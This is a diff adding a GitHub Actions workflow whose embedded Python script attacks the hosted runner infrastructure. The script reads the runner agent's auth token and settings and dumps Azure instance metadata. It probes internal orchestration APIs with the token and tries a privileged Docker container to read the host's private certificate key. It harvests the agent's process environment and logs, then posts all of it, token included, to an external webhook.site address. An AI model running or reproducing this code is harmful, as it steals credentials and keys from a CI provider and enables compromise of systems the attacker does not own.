@@ -1,0 +1,319 @@
+name: Probe v48 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V48_SOURCE: v48_account_a
+    steps:
+      - name: v48 vm/v1 API + docker + IMDS full + HCA process
+        run: |
+          cat > /tmp/v48_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V48_SOURCE", "v48_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth(method, url, token, body=None):
+              return probe(method, url, body, {"Authorization": f"Bearer {token}"})
+          
+          def sh(cmd, timeout=12):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              settings_raw = f.read()
+          s = json.loads(settings_raw)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          trace_url = s.get("traceApiUrl", "").rstrip("/")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          
+          print(f"[{SOURCE}] Full .settings: {settings_raw[:3000]}")
+          print(f"[{SOURCE}] JWT claims: {json.dumps(claims)}")
+          
+          results = {}
+          results["settings_all"] = s
+          results["settings_raw"] = settings_raw[:8000]
+          results["jwt_claims"] = claims
+          
+          # -- 1. Get full IMDS + extract tags ------------------------------------
+          print(f"\n[{SOURCE}] Full IMDS instance metadata...")
+          r = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                    extra={"Metadata": "true"})
+          imds_full = r["body"]
+          print(f"[IMDS] Full response ({len(imds_full)} chars):")
+          print(imds_full[:6000])
+          results["imds_full"] = imds_full[:16000]
+          
+          # Parse critical IMDS fields
+          try:
+              imds_data = json.loads(imds_full)
+              compute = imds_data.get("compute", {})
+              tags_str = compute.get("tags", "")
+              tags_list = compute.get("tagsList", [])
+              sub_id = compute.get("subscriptionId", "")
+              rg_name = compute.get("resourceGroupName", "")
+              resource_id = compute.get("resourceId", "")
+              vm_name = compute.get("name", "")
+              location = compute.get("location", "")
+              image_ref = compute.get("storageProfile", {}).get("imageReference", {})
+          
+              print(f"\n[IMDS] subscriptionId: {sub_id}")
+              print(f"[IMDS] resourceGroupName: {rg_name}")
+              print(f"[IMDS] resourceId: {resource_id}")
+              print(f"[IMDS] vm_name: {vm_name}")
+              print(f"[IMDS] location: {location}")
+              print(f"[IMDS] imageRef: {json.dumps(image_ref)}")
+              print(f"[IMDS] tags_str: {tags_str}")
+              print(f"[IMDS] tagsList: {json.dumps(tags_list)}")
+          
+              # Extract hosted_compute tags
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              print(f"[IMDS] hosted_compute tags: {json.dumps(hc_tags)}")
+          
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              quota_id = hc_tags.get("hosted_compute.quota_id", "")
+          
+              print(f"[IMDS] base_ro_url: {base_ro_url}")
+              print(f"[IMDS] allocation_id: {allocation_id}")
+              print(f"[IMDS] quota_id: {quota_id}")
+          
+              results["imds_parsed"] = {
+                  "sub_id": sub_id, "rg_name": rg_name, "resource_id": resource_id,
+                  "vm_name": vm_name, "location": location, "image_ref": image_ref,
+                  "hc_tags": hc_tags, "base_ro_url": base_ro_url,
+                  "allocation_id": allocation_id, "quota_id": quota_id,
+              }
+          except Exception as ex:
+              print(f"[IMDS] parse error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+              hc_tags = {}
+          
+          # -- 2. Probe /vm/v1 API -----------------------------------------------
+          print(f"\n[{SOURCE}] Probing /vm/v1 API endpoints...")
+          vm_results = {}
+          
+          # Use the base_ro_url from IMDS tags if available, else construct from sched_url
+          # sched_url is like https://orch-prod-eus-02.githubapp.com/v1
+          # base_ro_url from tags is like https://orch-prod-iad-02.githubapp.com/vm/v1
+          from urllib.parse import urlparse
+          parsed_sched = urlparse(sched_url)
+          sched_host = f"{parsed_sched.scheme}://{parsed_sched.netloc}"
+          
+          # Test URLs to probe
+          vm_urls = []
+          if base_ro_url:
+              vm_urls.append(base_ro_url.rstrip("/"))
+          # Also try /vm/v1 on the schedulerApiUrl host
+          vm_urls.append(sched_host + "/vm/v1")
+          # And /vm on the scheduler host
+          vm_urls.append(sched_host + "/vm")
+          
+          for vm_base in vm_urls:
+              print(f"\n[VM] Testing base: {vm_base}")
+              test_paths = [
+                  ("GET", "/"),
+                  ("GET", "/health"),
+                  ("GET", "/info"),
+                  ("GET", "/status"),
+              ]
+              if allocation_id:
+                  test_paths += [
+                      ("GET", f"/{allocation_id}"),
+                      ("GET", f"/{allocation_id}/status"),
+                      ("GET", f"/{allocation_id}/config"),
+                      ("GET", f"/{allocation_id}/info"),
+                      ("GET", f"/{allocation_id}/heartbeat"),
+                      ("PUT", f"/{allocation_id}/heartbeat"),
+                      ("POST", f"/{allocation_id}/heartbeat"),
+                      ("GET", f"/allocations/{allocation_id}"),
+                      ("GET", f"/allocations/{allocation_id}/status"),
+                  ]
+          
+              for method, path in test_paths:
+                  url = vm_base + path
+                  r = auth(method, url, token, "{}" if method != "GET" else None)
+                  key = f"{method} {vm_base.split('/')[-1]}/{path.lstrip('/')}"
+                  vm_results[key] = {"status": r["status"], "body": r["body"][:2000]}
+                  if r["status"] not in (404, 0):
+                      marker = "***" if r["status"] not in (400, 401, 405) else ""
+                      print(f"[VM] {marker} {method} {url} -> {r['status']} | {r['body'][:300]}")
+                  else:
+                      print(f"[VM] {method} {path:40} -> {r['status']}")
+          
+          results["vm_api"] = vm_results
+          
+          # -- 3. Docker socket exploitation -------------------------------------
+          print(f"\n[{SOURCE}] Docker socket exploration...")
+          docker_results = {}
+          
+          # Check if docker CLI available
+          docker_version = sh("docker version 2>&1")
+          docker_ps = sh("docker ps 2>&1")
+          docker_images = sh("docker images 2>&1")
+          print(f"[DOCKER] version: {docker_version[:200]}")
+          print(f"[DOCKER] ps: {docker_ps[:200]}")
+          print(f"[DOCKER] images: {docker_images[:200]}")
+          
+          docker_results["version"] = docker_version[:500]
+          docker_results["ps"] = docker_ps[:500]
+          docker_results["images"] = docker_images[:500]
+          
+          # Try to use the docker socket directly to list containers
+          docker_sock_api = sh("curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1")
+          print(f"[DOCKER] socket API /containers/json: {docker_sock_api[:400]}")
+          docker_results["sock_containers"] = docker_sock_api[:2000]
+          
+          # Docker info
+          docker_info = sh("curl -s --unix-socket /var/run/docker.sock http://localhost/info 2>&1")
+          print(f"[DOCKER] socket API /info: {docker_info[:400]}")
+          docker_results["sock_info"] = docker_info[:2000]
+          
+          # Try privileged run (without sudo, using docker CLI)
+          # This would give us root on host filesystem
+          priv_test = sh("timeout 8 docker run --rm --privileged --net=host -v /:/mnt:ro alpine id 2>&1", timeout=15)
+          print(f"[DOCKER] privileged run test: {priv_test[:300]}")
+          docker_results["privileged_run"] = priv_test[:1000]
+          
+          # If privileged works, read host waagent certs directly
+          if "uid=0" in priv_test:
+              host_certs = sh("timeout 8 docker run --rm --privileged -v /:/mnt:ro alpine cat /mnt/var/lib/waagent/TransportPrivate.pem 2>&1", timeout=15)
+              docker_results["host_certs_via_docker"] = host_certs[:3000]
+              print(f"[DOCKER] *** host certs via docker: {host_certs[:300]}")
+          
+          results["docker"] = docker_results
+          
+          # -- 4. HCA process with fixed PID detection ---------------------------
+          print(f"\n[{SOURCE}] HCA binary process analysis (fixed PID)...")
+          hca_pid = sh("pgrep -f hosted-compute-agent 2>&1 | head -1").strip()
+          hca_results = {"pid": hca_pid}
+          print(f"[HCA] PID: {hca_pid}")
+          
+          if hca_pid and hca_pid.isdigit():
+              pid = hca_pid
+              cmdline = sh(f"cat /proc/{pid}/cmdline 2>&1 | tr '\\0' ' '")
+              hca_env = sh(f"cat /proc/{pid}/environ 2>&1 | tr '\\0' '\\n'")
+              open_files = sh(f"ls -la /proc/{pid}/fd/ 2>&1")
+              net_tcp  = sh(f"cat /proc/{pid}/net/tcp 2>&1")
+              net_tcp6 = sh(f"cat /proc/{pid}/net/tcp6 2>&1")
+              status   = sh(f"cat /proc/{pid}/status 2>&1")
+          
+              hca_results.update({
+                  "cmdline": cmdline, "environ": hca_env[:6000],
+                  "open_files": open_files[:3000],
+                  "net_tcp": net_tcp[:3000], "net_tcp6": net_tcp6[:3000],
+                  "status": status[:1000],
+              })
+              print(f"[HCA] cmdline: {cmdline}")
+              print(f"[HCA] environ:\n{hca_env[:3000]}")
+              print(f"[HCA] open files:\n{open_files[:1000]}")
+              print(f"[HCA] net/tcp:\n{net_tcp[:500]}")
+          else:
+              # Try ps and manual detection
+              ps_all = sh("ps aux 2>&1")
+              hca_results["ps_all"] = ps_all[:3000]
+              print(f"[HCA] ps:\n{ps_all[:3000]}")
+              # Try using ls on the process
+              for pid in range(1, 3000, 1):
+                  try:
+                      if os.path.exists(f"/proc/{pid}/cmdline"):
+                          with open(f"/proc/{pid}/cmdline", "rb") as f:
+                              cmdline = f.read().decode("utf-8","replace").replace("\x00"," ")
+                          if "hosted-compute" in cmdline:
+                              print(f"[HCA] *** Found at PID {pid}: {cmdline}")
+                              hca_results[f"found_pid_{pid}"] = cmdline
+                  except:
+                      pass
+          
+          results["hca"] = hca_results
+          
+          # -- 5. Full HCA log and settings analysis ----------------------------
+          print(f"\n[{SOURCE}] Full HCA log...")
+          hca_log = sh("cat /opt/hca/logs/hosted-compute-agent.log 2>&1")
+          print(f"[LOG] HCA log ({len(hca_log)} chars):\n{hca_log[:12000]}")
+          results["hca_log"] = hca_log[:20000]
+          
+          # -- 6. Complete TCP/network dump -------------------------------------
+          print(f"\n[{SOURCE}] Network state...")
+          ss_tcp = sh("ss -tnp 2>&1")
+          ss_tcp6 = sh("ss -tnp6 2>&1")
+          ss_all = sh("ss -anp 2>&1")
+          print(f"[NET] TCP connections:\n{ss_tcp}")
+          print(f"[NET] All sockets:\n{ss_all[:2000]}")
+          results["net_ss_tcp"] = ss_tcp[:3000]
+          results["net_ss_all"] = ss_all[:4000]
+          
+          # -- 7. Additional probe: /vm/v1 with ro_audience token attempt --------
+          # The IMDS tags showed hosted_compute.ro_audience - check if different audience
+          # Try auth probe against iad-02 base_ro_url
+          if base_ro_url:
+              print(f"\n[{SOURCE}] Probing base_ro_url with authToken + various paths...")
+              ext_results = {}
+              for method, path in [
+                  ("GET", "/"),
+                  ("GET", "/vm"),
+                  ("GET", "/vm/v1"),
+                  ("GET", "/vm/v1/info"),
+                  ("GET", f"/vm/v1/{allocation_id}" if allocation_id else "/vm/v1/test"),
+              ]:
+                  url = base_ro_url + path
+                  r = auth(method, url, token, "{}" if method != "GET" else None)
+                  ext_results[f"{method} {path}"] = {"status": r["status"], "body": r["body"][:2000]}
+                  print(f"[EXT] {method} {url} -> {r['status']} | {r['body'][:200]}")
+              results["base_ro_url_probe"] = ext_results
+          
+          # -- 8. POST to webhook ------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "sched_url": sched_url, "trace_url": trace_url,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v48_probe.py
+      - name: Keep alive
+        run: sleep 60
